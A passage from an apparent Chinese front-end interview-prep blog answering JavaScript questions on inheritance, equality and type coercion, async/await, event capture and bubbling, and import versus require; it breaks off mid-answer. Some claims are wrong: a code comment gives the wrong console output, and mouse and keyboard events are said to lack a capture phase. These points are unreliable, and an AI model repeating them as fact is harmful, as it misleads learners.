<h3 id="20、你对继承有什么了解吗？有几种方式？优劣？"><a href="#20、你对继承有什么了解吗？有几种方式？优劣？" class="headerlink" title="20、你对继承有什么了解吗？有几种方式？优劣？"></a>20、你对继承有什么了解吗？有几种方式？优劣？</h3><p>继承是面向对象编程中的重要概念，用于描述对象之间的关系和属性共享。JavaScript支持多种方式来实现继承，每种方式都有其优势和劣势。以下是对继承的一些了解以及常见的继承方式：</p>
<h5 id="了解继承的概念"><a href="#了解继承的概念" class="headerlink" title="了解继承的概念"></a>了解继承的概念</h5><p>继承是一种机制，通过它一个对象（子类或派生类）可以获取另一个对象（父类或基类）的属性和方法。继承允许代码重用，减少了冗余，提高了可维护性。在继承关系中，父类通常包含通用的属性和方法，而子类可以继承这些属性和方法，并可以添加自己的特定属性和方法。</p>
<h5 id="常见的继承方式"><a href="#常见的继承方式" class="headerlink" title="常见的继承方式"></a>常见的继承方式</h5><ol>
<li><p><strong>原型链继承</strong>：</p>
<ul>
<li><strong>优势：</strong> 简单，易于理解和实现。</li>
<li><strong>劣势：</strong> 无法传递参数给父类构造函数，子类共享父类实例属性，容易产生属性污染。</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = <span class="hljs-string">&#x27;Parent&#x27;</span>;<br>&#125;<br><br><span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello from &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params"></span>) &#123;&#125;<br><span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Parent</span>();<br><br><span class="hljs-keyword">var</span> child = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>();<br>child.<span class="hljs-title function_">sayHello</span>(); <span class="hljs-comment">// 输出 &quot;Hello from Child&quot;</span><br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>构造函数继承</strong>：</p>
<ul>
<li><strong>优势：</strong> 可以传递参数给父类构造函数，避免属性污染。</li>
<li><strong>劣势：</strong> 无法继承父类原型上的方法。</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name || <span class="hljs-string">&#x27;Parent&#x27;</span>;<br>&#125;<br><br><span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello from &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-title class_">Parent</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, name);<br>&#125;<br><br><span class="hljs-keyword">var</span> child = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-string">&#x27;Child&#x27;</span>);<br>child.<span class="hljs-title function_">sayHello</span>(); <span class="hljs-comment">// 输出 &quot;Hello from Child&quot;</span><br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>组合继承</strong>（原型链继承和构造函数继承的组合）：</p>
<ul>
<li><strong>优势：</strong> 继承父类的属性和方法，避免属性污染，可以传递参数给父类构造函数。</li>
<li><strong>劣势：</strong> 调用了两次父类构造函数，导致性能开销较大。</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name || <span class="hljs-string">&#x27;Parent&#x27;</span>;<br>&#125;<br><br><span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello from &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-title class_">Parent</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, name);<br>&#125;<br><br><span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Parent</span>();<br><br><span class="hljs-keyword">var</span> child = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-string">&#x27;Child&#x27;</span>);<br>child.<span class="hljs-title function_">sayHello</span>(); <span class="hljs-comment">// 输出 &quot;Hello from Child&quot;</span><br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>ES6类继承</strong>：</p>
<ul>
<li><strong>优势：</strong> 基于类和继承关键字，语法更清晰，可读性更高。</li>
<li><strong>劣势：</strong> 不支持多继承。</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name || <span class="hljs-string">&#x27;Parent&#x27;</span>;<br>  &#125;<br><br>  <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello from &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(name);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> child = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-string">&#x27;Child&#x27;</span>);<br>child.<span class="hljs-title function_">sayHello</span>(); <span class="hljs-comment">// 输出 &quot;Hello from Child&quot;</span><br></code></pre></td></tr></table></figure></li>
</ol>
<h5 id="选择继承方式的考虑因素"><a href="#选择继承方式的考虑因素" class="headerlink" title="选择继承方式的考虑因素"></a>选择继承方式的考虑因素</h5><p>选择合适的继承方式取决于具体的需求和场景：</p>
<ul>
<li>如果你需要简单的继承关系，并且不需要传递参数给父类构造函数，原型链继承是一个简单的选择。</li>
<li>如果需要传递参数给父类构造函数，构造函数继承或组合继承是合适的。</li>
<li>如果你在一个支持ES6的环境中工作，类继承提供了一种更现代和清晰的方式来实现继承。</li>
</ul>
<p>需要根据具体的需求和项目来选择合适的继承方式，并权衡每种方式的优劣。在实际开发中，也可以根据情况采用不同的继承方式来组合使用。</p>
<h3 id="21、js的比较"><a href="#21、js的比较" class="headerlink" title="21、js的比较"></a>21、js的比较</h3><h5 id="JS中常用的比较两个值相等的方式"><a href="#JS中常用的比较两个值相等的方式" class="headerlink" title="JS中常用的比较两个值相等的方式"></a>JS中常用的比较两个值相等的方式</h5><p>在 JavaScript 中，比较两个值是否相等有多种方式，每种方式都有其适用的场景。以下是一些常用的比较方式：</p>
<ol>
<li><p><strong>严格相等（Strict Equality）：</strong></p>
<ul>
<li>使用 <code>===</code> 运算符来比较两个值是否在相等值和相等类型上都相同。如果两个值的类型和值都相同，返回 <code>true</code>，否则返回 <code>false</code>。</li>
<li>例如：<code>5 === 5</code> 返回 <code>true</code>，<code>&#39;hello&#39; === &#39;world&#39;</code> 返回 <code>false</code>。</li>
</ul>
</li>
<li><p><strong>松散相等（Loose Equality）：</strong></p>
<ul>
<li>使用 <code>==</code> 运算符来比较两个值是否在相等值上相同。它会进行类型转换，将值转换为相同类型后再比较。如果值相等，返回 <code>true</code>，否则返回 <code>false</code>。</li>
<li>例如：<code>5 == &#39;5&#39;</code> 返回 <code>true</code>，<code>null == undefined</code> 返回 <code>true</code>。</li>
</ul>
</li>
<li><p><strong>Object.is() 方法：</strong></p>
<ul>
<li>使用 <code>Object.is()</code> 方法比较两个值是否在相等值和相等类型上都相同，类似于严格相等（<code>===</code>）。但它有一些特殊的行为，例如对待 <code>NaN</code> 和 <code>-0</code> 不同。</li>
<li>例如：<code>Object.is(5, 5)</code> 返回 <code>true</code>，<code>Object.is(NaN, NaN)</code> 返回 <code>true</code>。</li>
</ul>
</li>
<li><p><strong>浅比较对象（Shallow Object Comparison）：</strong></p>
<ul>
<li>对于对象（包括数组），可以使用 <code>===</code> 或 <code>Object.is()</code> 来比较它们的引用是否相同。这是浅比较，不会递归比较对象的属性。</li>
<li>例如：<code>&#123;&#125; === &#123;&#125;</code> 返回 <code>false</code>，<code>[1, 2, 3] === [1, 2, 3]</code> 返回 <code>false</code>。</li>
</ul>
</li>
<li><p><strong>深比较对象（Deep Object Comparison）：</strong></p>
<ul>
<li>对于深度比较对象，通常需要自定义函数或使用第三方库来递归比较对象的属性。常见的库包括 lodash 的 <code>_.isEqual()</code> 方法。</li>
</ul>
</li>
<li><p><strong>三元运算符（Ternary Operator）：</strong></p>
<ul>
<li>使用三元运算符 <code>condition ? valueIfTrue : valueIfFalse</code> 来根据条件返回不同的值，这也可以用于比较两个值。</li>
<li>例如：<code>5 &gt; 3 ? &#39;greater&#39; : &#39;less&#39;</code> 返回 <code>&#39;greater&#39;</code>。</li>
</ul>
</li>
</ol>
<p>选择哪种比较方式取决于你的需求和比较的对象类型。对于简单的值比较，严格相等运算符 <code>===</code> 是首选，因为它不会进行类型转换。但在某些情况下，需要考虑类型转换的影响，可以使用松散相等运算符 <code>==</code> 或 <code>Object.is()</code>。对于对象比较，需要根据深浅比较的需求选择合适的方式。</p>
<h5 id="x3D-x3D-0-输出啥"><a href="#x3D-x3D-0-输出啥" class="headerlink" title="([]&#x3D;&#x3D;0)输出啥"></a>([]&#x3D;&#x3D;0)输出啥</h5><p><code>([] == 0)</code> 的结果是 <code>true</code>。</p>
<p>这可能会令人感到惊讶，但它是 JavaScript 中的一种类型转换规则。在这个比较中，左侧的 <code>[]</code> 是一个空数组，右侧的 <code>0</code> 是一个数字。</p>
<p>在 JavaScript 中，当进行 <code>==</code> 松散相等比较时，如果操作数的类型不同，JavaScript 会尝试将它们转换为共同的类型，然后再进行比较。在这个情况下，空数组 <code>[]</code> 被转换成了数字，具体的转换步骤如下：</p>
<ol>
<li>JavaScript 尝试将左侧的空数组 <code>[]</code> 转换成数字。</li>
<li>空数组在进行类型转换时会被视为 0。</li>
<li>因此，比较变成了 <code>0 == 0</code>。</li>
<li>最终结果是 <code>true</code>，因为 <code>0</code> 等于 <code>0</code>。</li>
</ol>
<p>这种类型转换规则使得 <code>([] == 0)</code> 返回 <code>true</code>，但通常建议使用严格相等运算符 <code>===</code> 来避免这种类型转换带来的意外结果，因为 <code>===</code> 不会进行类型转换，只有在值和类型都相同时才返回 <code>true</code>。</p>
<h5 id="x3D-x3D-怎么进行类型转换"><a href="#x3D-x3D-怎么进行类型转换" class="headerlink" title="&#x3D;&#x3D;怎么进行类型转换"></a>&#x3D;&#x3D;怎么进行类型转换</h5><p>在 JavaScript 中，<code>==</code> 运算符进行类型转换的过程如下：</p>
<ol>
<li><p>**如果两个操作数的类型相同（严格相等），则直接返回比较结果，不进行类型转换。例如，<code>5 == 5</code> 返回 <code>true</code>。</p>
</li>
<li><p>**如果两个操作数的类型不同，JavaScript 会尝试将它们转换为相同的类型，然后再进行比较。</p>
<ul>
<li><p>如果一个操作数是字符串，另一个是数字，JavaScript 会尝试将字符串转换为数字，然后进行比较。例如，<code>&#39;5&#39; == 5</code> 返回 <code>true</code>，因为字符串 <code>&#39;5&#39;</code> 被转换成了数字 <code>5</code>。</p>
</li>
<li><p>如果一个操作数是对象，另一个是原始类型（数字、字符串、布尔等），JavaScript 会尝试调用对象的 <code>valueOf()</code> 方法，然后再进行比较。如果 <code>valueOf()</code> 返回的是原始类型值，就将其与另一个操作数进行比较。如果 <code>valueOf()</code> 返回的是对象本身，会继续尝试调用 <code>toString()</code> 方法，然后再比较。这个过程称为对象的类型转换。</p>
</li>
<li><p>如果一个操作数是 <code>null</code>，另一个是 <code>undefined</code>，它们会被认为相等，返回 <code>true</code>。</p>
</li>
<li><p>如果其中一个操作数是 <code>NaN</code>，比较结果通常是 <code>false</code>，因为 <code>NaN</code> 不等于任何值，包括它自己。</p>
</li>
<li><p>如果一个操作数是布尔值，另一个是非布尔值，布尔值会被转换成数字 <code>1</code>（如果为 <code>true</code>）或 <code>0</code>（如果为 <code>false</code>），然后进行比较。</p>
</li>
<li><p>如果一个操作数是 <code>undefined</code>，另一个是非 <code>null</code> 对象，它们会被认为不相等。</p>
</li>
</ul>
</li>
<li><p><strong>最终返回比较的结果。</strong></p>
</li>
</ol>
<p>这种类型转换规则使得 <code>==</code> 运算符比较灵活，但也容易导致一些意外的结果，因此在编写代码时，通常更推荐使用严格相等运算符 <code>===</code>，因为它不进行类型转换，只有在值和类型都相同时才返回 <code>true</code>。这有助于避免类型转换可能带来的不确定性。</p>
<h3 id="22、解释一下async-await的实现原理"><a href="#22、解释一下async-await的实现原理" class="headerlink" title="22、解释一下async await的实现原理"></a>22、解释一下async await的实现原理</h3><p><code>async/await</code> 是 JavaScript 中用于处理异步操作的一种语法糖，它使异步代码看起来更像同步代码，更容易理解和维护。<code>async/await</code> 的实现原理涉及到两个关键概念：Promise 和生成器（Generator）。</p>
<p>下面是 <code>async/await</code> 的基本原理：</p>
<ol>
<li><p><strong>Promise：</strong> <code>async</code> 函数内部的所有异步操作都被封装成了 Promise 对象。这意味着 <code>async</code> 函数中的异步操作会返回一个 Promise，可以使用 <code>then</code> 方法来处理异步操作的结果。</p>
</li>
<li><p><strong>生成器（Generator）：</strong> <code>async</code> 函数本质上是一种特殊的生成器函数。生成器是一种可以暂停和恢复执行的函数，它通过 <code>yield</code> 关键字来实现暂停，然后通过 <code>next</code> 方法来继续执行。</p>
</li>
<li><p><strong><code>await</code> 关键字：</strong> 在 <code>async</code> 函数中，<code>await</code> 关键字用于等待一个 Promise 对象的解决（或拒绝）并返回其结果。当遇到 <code>await</code> 关键字时，<code>async</code> 函数会暂停执行，让出线程，直到 Promise 对象状态变为解决或拒绝，并返回结果。这个过程是异步的，不会阻塞其他代码的执行。</p>
</li>
<li><p><strong><code>async</code> 函数的返回值：</strong> <code>async</code> 函数会返回一个 Promise 对象。如果 <code>async</code> 函数中的代码执行完毕并没有返回其他值，该 Promise 对象会自动解决为 <code>undefined</code>。</p>
</li>
</ol>
<p>下面是一个示例，演示了 <code>async/await</code> 的基本工作原理：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/data&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Fetch failed&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>    <span class="hljs-keyword">return</span> data;<br>  &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error:&#x27;</span>, error);<br>    <span class="hljs-keyword">throw</span> error;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 使用 async 函数</span><br><span class="hljs-title function_">fetchData</span>()<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Data:&#x27;</span>, data);<br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Fetch error:&#x27;</span>, error);<br>  &#125;);<br></code></pre></td></tr></table></figure>

<p>在上述示例中，<code>async</code> 函数 <code>fetchData</code> 中的异步操作（<code>fetch</code> 和 <code>response.json()</code>）都返回 Promise 对象，并使用 <code>await</code> 关键字等待其解决。<code>fetchData</code> 函数返回一个 Promise，可以使用 <code>then</code> 和 <code>catch</code> 处理异步操作的结果和错误。</p>
<p>总结来说，<code>async/await</code> 的实现原理基于 Promise 和生成器，通过 <code>await</code> 关键字实现异步操作的等待和暂停，使代码看起来更加同步化，易于理解和编写。这提高了异步代码的可读性和可维护性。</p>
<h3 id="23、冒泡事件和捕获事件执行顺序"><a href="#23、冒泡事件和捕获事件执行顺序" class="headerlink" title="23、冒泡事件和捕获事件执行顺序"></a>23、冒泡事件和捕获事件执行顺序</h3><p>事件传播是指在 HTML 文档中，当一个事件（例如点击鼠标、按键盘键等）在 DOM 元素上触发时，这个事件如何从文档根节点传播到目标元素，然后再从目标元素冒泡回文档根节点的过程。在DOM事件处理中，有两种主要的事件传播方式：冒泡事件和捕获事件。它们的执行顺序如下：</p>
<ol>
<li><p><strong>捕获阶段（Capture Phase）：</strong> 事件从根元素（通常是<code>document</code>对象）向目标元素（触发事件的元素）传播的阶段。在这个阶段，事件从根元素向下逐级传播，直到达到目标元素。</p>
</li>
<li><p><strong>目标阶段（Target Phase）：</strong> 事件到达目标元素时触发，即在目标元素上执行事件处理程序。</p>
</li>
<li><p><strong>冒泡阶段（Bubble Phase）：</strong> 事件从目标元素开始，沿着DOM树向上冒泡传播，直到根元素。在这个阶段，事件可以被更上层的父元素捕获并触发相应的事件处理程序。</p>
</li>
</ol>
<p>执行顺序可以总结如下：</p>
<ul>
<li>事件首先进入捕获阶段，从根元素向下传播到目标元素。</li>
<li>事件触发目标阶段，执行目标元素上的事件处理程序。</li>
<li>事件然后进入冒泡阶段，从目标元素向上冒泡传播到根元素。</li>
</ul>
<p>在实际开发中，通常我们将事件处理程序绑定在目标元素上，因此大部分情况下我们更关心捕获阶段和冒泡阶段是否会被触发。可以使用 <code>addEventListener</code> 方法的第三个参数来控制事件的传播方式：</p>
<ul>
<li>如果设置为 <code>true</code>，事件在捕获阶段执行。</li>
<li>如果设置为 <code>false</code>，事件在冒泡阶段执行（默认值）。</li>
</ul>
<p>例如：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">element.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, handler, <span class="hljs-literal">true</span>); <span class="hljs-comment">// 捕获阶段执行</span><br>element.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, handler, <span class="hljs-literal">false</span>); <span class="hljs-comment">// 冒泡阶段执行</span><br></code></pre></td></tr></table></figure>

<p>需要注意的是，并不是所有的事件都支持捕获阶段。一些事件，如鼠标事件和键盘事件，通常只在冒泡阶段触发。</p>
<h5 id="事件委托"><a href="#事件委托" class="headerlink" title="事件委托"></a>事件委托</h5><p>事件委托（Event delegation）是一种 JavaScript 编程技巧，它利用事件冒泡机制来优化事件处理程序的性能。通过事件委托，你可以将事件处理程序绑定到一个父元素，而不是将事件处理程序绑定到多个子元素，从而减少了事件处理程序的数量，并提高了性能。</p>
<p>以下是事件委托的基本工作原理和优势：</p>
<ol>
<li><p><strong>工作原理</strong>：</p>
<ul>
<li>事件委托利用事件冒泡的特性，事件从子元素冒泡到父元素，然后再冒泡到更高级的祖先元素，最终到达文档根元素。</li>
<li>你可以将事件处理程序绑定到一个父元素（通常是最近的共同祖先），并在事件冒泡到父元素时检查事件的目标（<code>event.target</code>）来确定是哪个子元素触发了事件。</li>
<li>这样，你就可以在一个地方管理多个子元素的事件，而不必为每个子元素都绑定事件处理程序。</li>
</ul>
</li>
<li><p><strong>优势</strong>：</p>
<ul>
<li>减少事件处理程序的数量：通过将事件处理程序绑定到父元素，而不是每个子元素，可以减少代码中的事件处理程序数量，使代码更加简洁和可维护。</li>
<li>动态添加和删除元素：事件委托适用于动态添加或删除子元素的情况，因为无需重新绑定事件处理程序，而新的子元素也会继承事件处理。</li>
<li>提高性能：在大量子元素存在的情况下，事件委托可以提高性能，因为减少了事件处理程序的数量，避免了内存和性能开销。</li>
</ul>
</li>
</ol>
<p>以下是一个事件委托的示例，假设我们有一个列表，其中包含多个列表项，我们希望在点击任何列表项时弹出相应的文本内容：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myList&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Item 1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Item 2<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Item 3<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Item 4<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Item 5<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 获取父元素</span><br><span class="hljs-keyword">const</span> myList = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;myList&#x27;</span>);<br><br><span class="hljs-comment">// 为父元素绑定事件处理程序</span><br>myList.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) &#123;<br>  <span class="hljs-comment">// 检查事件目标是否是列表项</span><br>  <span class="hljs-keyword">if</span> (event.<span class="hljs-property">target</span>.<span class="hljs-property">tagName</span> === <span class="hljs-string">&#x27;LI&#x27;</span>) &#123;<br>    <span class="hljs-comment">// 弹出列表项的文本内容</span><br>    <span class="hljs-title function_">alert</span>(event.<span class="hljs-property">target</span>.<span class="hljs-property">textContent</span>);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure>

<p>在这个示例中，我们将点击事件处理程序绑定到父元素 <code>myList</code> 上，并通过检查事件目标的标签名来确定点击的是哪个列表项。这样，无论有多少个列表项，我们都可以在一个地方管理点击事件，而不必为每个列表项单独绑定事件处理程序。这提高了代码的可维护性和性能。</p>
<h3 id="24、JS中import和require区别"><a href="#24、JS中import和require区别" class="headerlink" title="24、JS中import和require区别"></a>24、JS中import和require区别</h3><p><code>import</code> 和 <code>require</code> 都是 JavaScript 中用于导入模块的关键字，但它们有一些重要的区别，主要涉及到模块系统的不同和语法：</p>
<ol>
<li>模块系统的不同：</li>
</ol>
<ul>
<li><code>import</code> 是 ECMAScript 6 (ES6) 中引入的模块系统的一部分，它是 JavaScript 的官方标准，逐渐成为主流的模块导入方式。</li>
<li><code>require</code> 是 Node.js 中使用的 CommonJS 模块系统的一部分，它是 Node.js 特有的模块导入方式。</li>
</ul>
<ol start="2">
<li>语法的不同：</li>
</ol>
<ul>
<li><code>import</code> 使用 ES6 的模块导入语法，它采用了类似于 <code>import &#123; module &#125; from &#39;module&#39;</code> 或 <code>import module from &#39;module&#39;</code> 的语法，可以实现按需导入和默认导入。</li>
<li><code>require</code> 使用 CommonJS 的模块导入语法，它采用了 <code>require(&#39;module&#39;)</code> 的语法，不支持 ES6 的模块语法特性。</li>
</ul>
<ol start="3">
<li>执行时机的不同：</li>
</ol>
<ul>
<li><code>import</code> 是编译时加载，意味着模块在代码执行前就已经加载和解析完毕。这可以帮助提前发现模块的语法错误。</li>
<li><code>require</code> 是运行时加载，模块在代码执行时才会加载和执行，这意味着在运行时可能会发生模块加载的错误。</li>
</ul>
<ol start="4">
<li>浏览器支持的不同：</li>
</ol>
<ul>
<li><code>import</code> 是 ES6 的一部分，浏览器对它的支持逐渐增加，但并不是所有浏览器都支持。为了在浏览器中使用 <code>import</code>，通常需要使用工具如 Babel 进行转译。</li>
<li><code>require</code> 是 Node.js 的一部分，不适用于浏览器环境，除非使用 Browserify 或 webpack 等工具进行构建。</li>
</ul>
<p>总结：</p>
<ul>
<li>在 Node.js 环境中，你应该使用 <code>require</code>。</li>
<li>在现代的前端开发中，尤其是使用 ES6 模块语法的情况下，应该使用 <code>import</code>。</li>
<li>如果需要在浏览器中使用 <code>import</code>，通常需要借助构建工具进行转译和打包。</li>
</ul>
<h3 id="26、genertor和async区别"><a href="#26、genertor和async区别" class="headerlink" title="26、genertor和async区别"></a>26、genertor和async区别</h3><p>Generator 和 async&#x2F;await 都是 JavaScript 中用于处理异步操作的机制，但它们之间有一些重要的区别。</p>
<ol>
<li><p><strong>语法和用法：</strong></p>
<ul>
<li>Generator 使用 <code>function*</code> 声明，并使用 <code>yield</code> 关键字来产生值。通过调用 Generator 函数，可以生成一个迭代器对象，然后可以通过迭代器的 <code>.next()</code> 方法来逐步执行 Generator 函数内部的代码。</li>
<li>async&#x2F;await 使用 <code>async</code> 和 <code>await</code> 关键字来声明和使用。通过将 <code>async</code> 关键字放在函数前面，可以将函数标记为异步函数，然后在异步函数内部使用 <code>await</code> 来等待异步操作的完成。</li>
</ul>
</li>
<li><p><strong>执行方式：</strong></p>
<ul>
